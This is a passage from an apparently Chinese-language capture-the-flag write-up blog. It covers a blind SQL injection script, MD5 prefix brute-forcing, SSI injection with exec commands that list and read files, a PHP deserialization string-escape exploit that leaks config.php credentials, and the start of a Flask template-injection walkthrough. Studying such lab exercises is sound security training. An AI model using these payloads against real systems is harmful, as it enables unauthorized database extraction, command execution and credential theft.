class="hljs-string">&quot;?id=1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot;</span>%(i,j)<br>        data = <span class="hljs-string">&quot;?id=1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;</span> % (i, j)<br>        <span class="hljs-comment"># 根据需要查询的内容改变get中的参数</span><br>        r = requests.get(url=url+database)<br>        <span class="hljs-comment"># print(url+database)</span><br>        <span class="hljs-comment"># print(payload1)</span><br>        <span class="hljs-comment"># print(r.raw)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Click&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>            low = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            high = mid<br>        <span class="hljs-comment"># print(low,mid,high)</span><br>    flag += <span class="hljs-built_in">chr</span>(low)<br>    <span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure><h2 id="9-BJDCTF2020-EasySearch"><a href="#9-BJDCTF2020-EasySearch" class="headerlink" title="9.[BJDCTF2020]EasySearch"></a>9.[BJDCTF2020]EasySearch</h2><p>在首界面审查源代码、抓包未获取到有效信息，就开始进行目录扫描，获取到index.php.swp文件，结果如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ob_start();<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_hash</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;<br><span class="hljs-variable">$random</span> = <span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)];<span class="hljs-comment">//Random 5 times</span><br><span class="hljs-variable">$content</span> = uniqid().<span class="hljs-variable">$random</span>;<br><span class="hljs-keyword">return</span> sha1(<span class="hljs-variable">$content</span>); <br>&#125;<br>    header(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br>***<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;&#x27;</span> )<br>    &#123;<br>        <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;6d0bc1&#x27;</span>;<br>        <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$admin</span> == substr(md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;<br>            <span class="hljs-variable">$file_shtml</span> = <span class="hljs-string">&quot;public/&quot;</span>.get_hash().<span class="hljs-string">&quot;.shtml&quot;</span>;<br>            <span class="hljs-variable">$shtml</span> = fopen(<span class="hljs-variable">$file_shtml</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);<br>            <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/h1&gt;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">***&#x27;</span>;<br>            fwrite(<span class="hljs-variable">$shtml</span>,<span class="hljs-variable">$text</span>);<br>            fclose(<span class="hljs-variable">$shtml</span>);<br>            ***<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[!] Header  error ...&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;<br>            <br>    &#125;<span class="hljs-keyword">else</span><br>    &#123;<br>***<br>    &#125;<br>***<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python 跑出来一个</span><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100000000</span>):<br>    md5 = hashlib.md5(<span class="hljs-built_in">str</span>(i).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br>    <span class="hljs-keyword">if</span> md5[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == <span class="hljs-string">&#x27;6d0bc1&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;success!&#x27;</span>)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(i)<br>        <br><span class="hljs-built_in">hash</span>.digest() ：返回摘要，作为二进制数据字符串值<br><span class="hljs-built_in">hash</span>.hexdigest()：返回摘要，作为十六进制数据字符串值<br>hashlib.md5(<span class="hljs-string">&#x27;2020666&#x27;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))：<br>    &lt;md5 HASH <span class="hljs-built_in">object</span> @ <span class="hljs-number">0x000001DAE7237DD0</span>&gt;<br><br>hashlib.md5(<span class="hljs-string">&#x27;2020666&#x27;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()：<br>6d0bc1153791aa2b4e18b4f344f26ab4<br><br></code></pre></td></tr></table></figure><p>我们观察到页面需要显示：      </p><p>SSI 注入全称Server-Side Includes Injection（服务端包含注入），ssi可以赋予html静态页面的动态效果，通过ssi执行命令，返回对应的结果，当在网站目录中发现了.stm .shtm .shtml或在界面中发现了就容易产生ssi注入，此处问题的其注入格式为：<!--#exec cmd="命令" --></p><p><a href="https://www.cnblogs.com/seizer/p/17035775.html">SSI学习</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello,&#x27;.$_POST[&#x27;username&#x27;].&#x27;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><br>&lt;所以这里存在一个注入点&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;$what&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Welcome, &#123;&#123;username&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;%$a%&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>payload:    <br><span class="hljs-comment">&lt;!--#exec cmd=&quot;命令&quot; --&gt;</span><br><span class="hljs-comment">&lt;!--#exec cmd=&quot;ls&quot; --&gt;</span><br>    Hello,052f5d5cb988c12c5054146e8e62133793164e04.shtml 277daf029727c9cbe7acc31d7840353a65fc8e9f.shtml 2b88015534a75975d2f8f95ba084719b8274e017.shtml 2dc1b67c1009e4a8f9d9af70f3d875eb15d94e87.shtml<br>    ……………………………………<br><span class="hljs-comment">&lt;!--#exec cmd=&quot;ls ../&quot; --&gt;</span><br>    Hello,flag_990c66bf85a09c664f0b6741840499b2 index.php index.php.swp public<br><br><span class="hljs-comment">&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;</span><br>Hello,flag&#123;865df233-2a82-48be-b90c-8d87005a8007&#125;<br><br></code></pre></td></tr></table></figure><h2 id="10-0CTF-2016-piapiapia"><a href="#10-0CTF-2016-piapiapia" class="headerlink" title="10.[0CTF 2016]piapiapia"></a>10.[0CTF 2016]piapiapia</h2><p>search扫描发现有一个<a href="http://www.zip的压缩包，下载下来后有：index.php">www.zip的压缩包，下载下来后有：index.php</a> register.php config.php update.php profile.php class.php</p><p>注意到只有config.php里面包含有flag的信息，所以我们需要想办法将其文件包含出来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//config.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;hostname&#x27;</span>] = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;database&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>注意到profile.php界面是将这些变量直接输出的</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-top:100px&quot;</span>&gt;</span>  <br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:image/gif;base64,&lt;?php echo $photo; ?&gt;&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;img-memeda &quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width:180px;margin:0px auto;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>Hi &lt;?php echo $nickname;?&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>Phone: &lt;?php echo $phone;?&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>Email: &lt;?php echo $email;?&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">//update.php<br>&lt;?<br>$profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;];<br>$profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;];<br>$profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;];<br>$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]);<br><br>$user-&gt;update_profile($username, serialize($profile));<br>//这里进行了一次反序列化，调用update_profile函数，在class.php里面有写出来<br>public function update_profile($username, $new_profile) &#123;<br>$username = parent::filter($username);<br>$new_profile = parent::filter($new_profile);<br><br>$where = &quot;username = &#x27;$username&#x27;&quot;;<br>return parent::update($this-&gt;table, &#x27;profile&#x27;, $new_profile, $where);<br>&#125;<br>//filter函数：<br>public function filter($string) &#123;<br>$escape = array(&#x27;\&#x27;&#x27;, &#x27;\\\\&#x27;);<br>$escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;;<br>$string = preg_replace($escape, &#x27;_&#x27;, $string);<br><br>$safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;);<br>$safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;;<br>return preg_replace($safe, &#x27;hacker&#x27;, $string);<br>&#125;<br>我们注意到会把$safe名单里面的函数全部替换成hacker，此时，只有where是五个字节，而其他的都是6个字节，可以利用此一个字节的差异构造链子来进行序列化使之达到我们想要的文件包含。<br>    <br>//profile.php<br>&lt;?<br>    <br>$profile = unserialize($profile);<br>$phone = $profile[&#x27;phone&#x27;];<br>$email = $profile[&#x27;email&#x27;];<br>$nickname = $profile[&#x27;nickname&#x27;];<br>$photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;]));<br>//两次对$profile进行了序列化与反序列化，可能存在利用<br><br>//我们想要的链子：&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;<br>//这样的话，图片那边的文件链接就会连接到本地的config.php从而打开此文件，实现文件包含<br>//想要的链子长度：33个字节<br>//因为一个此preg_replace只能多出来一个字符，所以我们需要构造33个where来换取33个字节的溢出，实现我们的序列化正常修改成我们想要的数据<br><br>//利用代码<br>&lt;?php<br><br>function filter($string) &#123;<br>    $safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;);<br>    $safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;;<br>    return preg_replace($safe, &#x27;hacker&#x27;, $string);<br>&#125;<br>$profile[&#x27;phone&#x27;]=&#x27;12345678901&#x27;;<br>$profile[&#x27;email&#x27;]=&#x27;lionelkkk@qq.com&#x27;;<br>$profile[&#x27;nickname&#x27;]=&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;;<br>$profile[&#x27;photo&#x27;] =&#x27;ffgfgfgf&#x27;;<br><br><br>$a=serialize($profile);<br>echo $a.&quot;\n&quot;;<br><br>$b=filter($a);<br>echo $b.&quot;\n&quot;;<br><br>$b=unserialize($b);<br>var_dump($b);<br><br><br>//输出<br>a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:16:&quot;lionelkkk@qq.com&quot;;s:8:&quot;nickname&quot;;s:198:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;s:5:&quot;photo&quot;;s:8:&quot;ffgfgfgf&quot;;&#125;<br>a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:16:&quot;lionelkkk@qq.com&quot;;s:8:&quot;nickname&quot;;s:198:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;s:5:&quot;photo&quot;;s:8:&quot;ffgfgfgf&quot;;&#125;<br>array(4) &#123;<br>  [&quot;phone&quot;]=&gt;<br>  string(11) &quot;12345678901&quot;<br>  [&quot;email&quot;]=&gt;<br>  string(16) &quot;lionelkkk@qq.com&quot;<br>  [&quot;nickname&quot;]=&gt;<br>  string(198) &quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;<br>  [&quot;photo&quot;]=&gt;<br>  string(10) &quot;config.php&quot;<br>&#125;<br>//但是很快发现对变量$nickname有一个长度限制，所以我们抓包的时候将变量nickname[]改成此数组的形式可以绕开长度的限制。<br>if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10)<br>die(&#x27;Invalid nickname&#x27;);<br>//因此，我们的利用链也需要同步进行更新<br><br>//分析一个数组的序列化<br>s:3:&quot;arr&quot;;a:2:&#123;s:1:&quot;w&quot;;s:5:&quot;wwwww&quot;;s:1:&quot;k&quot;;s:5:&quot;kkkkk&quot;;&#125;<br>//注意到是有  &#125;  的,所以我们构造链子的时候只需要在;后面加一个  &#125;  就行,因为链子多了一个字符，所以我们的where同理也需要再增加一个,再次发包update.php页面，然后查看profile.php页面查看源代码就可以看到图片src被替换成了config.php文件的base64内容,转一下base64解码就可以看到flag<br>    &quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;<br>    <br>PD9waHAKJGNvbmZpZ1snaG9zdG5hbWUnXSA9ICcxMjcuMC4wLjEnOwokY29uZmlnWyd1c2VybmFtZSddID0gJ3Jvb3QnOwokY29uZmlnWydwYXNzd29yZCddID0gJ3F3ZXJ0eXVpb3AnOwokY29uZmlnWydkYXRhYmFzZSddID0gJ2NoYWxsZW5nZXMnOwokZmxhZyA9ICdmbGFnezZlZmNhYmQ1LWQzYjctNGM4Zi04NGNmLWQ1NWVmYmJiYzEzOH0nOwo/Pgo=<br><br>&lt;?php<br>$config[&#x27;hostname&#x27;] = &#x27;127.0.0.1&#x27;;<br>$config[&#x27;username&#x27;] = &#x27;root&#x27;;<br>$config[&#x27;password&#x27;] = &#x27;qwertyuiop&#x27;;<br>$config[&#x27;database&#x27;] = &#x27;challenges&#x27;;<br>$flag = &#x27;flag&#123;6efcabd5-d3b7-4c8f-84cf-d55efbbbc138&#125;&#x27;;<br>?&gt;<br><br></code></pre></td></tr></table></figure><h1 id="2-XCTF—-WP"><a href="#2-XCTF—-WP" class="headerlink" title="2.XCTF—-WP"></a>2.XCTF—-WP</h1><h2 id="1-Web-python-template-injection"><a href="#1-Web-python-template-injection" class="headerlink" title="1.Web_python_template_injection"></a>1.Web_python_template_injection</h2><p>D:\blog\pict\webflask1.png</p><p>D:\blog\pict\webflask2.png</p><p>如上可以看出是模板注入，在此处大括号中执行代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">__class__  <span class="hljs-comment">#返回类型所属的对象</span><br>__mro__    <span class="hljs-comment">#返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br>__base__   <span class="hljs-comment">#返回该对象所继承的基类  // __base__和__mro__都是用来寻找基类的</span><br><br>__subclasses__   <span class="hljs-comment">#每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br>__init__  <span class="hljs-comment">#类的初始化方法</span><br>__globals__  <span class="hljs-comment">#对包含函数全局变量的字典的引用</span><br><br></code></pre></td></tr></table></figure><p><strong>寻找可用引用</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()&#125;&#125;<br></code></pre></td></tr></table></figure><p>D:\blog\pict\webflask3.png</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[&lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;NoneType&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;super&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;xrange&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;set&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;float&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;buffer&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;long&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;property&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;code&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;instancemethod&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;function&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;classobj&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dictproxy&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;generator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;instance&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;ellipsis&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;file&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;callable-iterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.long_info&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.float_info&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;EncodingMap&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;fieldnameiterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;formatteriterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.version_info&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.flags&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span 